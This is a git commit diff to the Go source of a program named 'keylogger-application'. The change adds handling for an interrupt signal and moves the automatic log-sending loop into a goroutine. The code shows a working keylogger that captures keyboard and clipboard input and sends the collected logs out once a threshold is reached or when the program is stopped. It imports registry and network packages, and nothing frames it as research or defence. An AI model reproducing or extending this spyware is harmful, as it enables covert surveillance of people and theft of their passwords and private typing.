798f96dfed4bf943e595a1717b124b721a90c9a6
AreSZerA <18722064@bjtu.edu.cn>
2022-04-02 13:40:35 +0800

    Send residual logs when received interrupt signal

--- keylogger-application/keylogger.go
+++ keylogger-application/keylogger.go
@@ -13,6 +13,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 	"net"
 	"os"
+	"os/signal"
 	"runtime"
 	"time"
 )
@@ -63,10 +64,17 @@ func main() {
 	go listenClipboard()
 	// Start a goroutine to listen keyboard.
 	go listenKeyboard()
-	// Auto send.
-	for {
-		// When have logged to the thresh, send and clear the recorded logs.
-		if len(keyLogs) >= MaxLog {
+	// Start a goroutine to send logs.
+	go autoSend()
+	// Make a channel for receiving system signal.
+	c := make(chan os.Signal)
+	// Detect interrupt (ctrl+C) signal.
+	signal.Notify(c, os.Interrupt)
+	// Block until received interrupt signal.
+	select {
+	case <-c:
+		// Send the residual logs.
+		if len(keyLogs) > 0 {
 			sendLogs()
 		}
 	}
@@ -144,6 +152,16 @@ func listenKeyboard() {
 					}
 				}
 			}
+		}
+	}
+}
+
+// autoSend detects the length of logs and determines to send.
+func autoSend() {
+	for {
+		// When have logged to the thresh, send and clear the recorded logs.
+		if len(keyLogs) >= MaxLog {
+			sendLogs()
 		}
 	}
 }
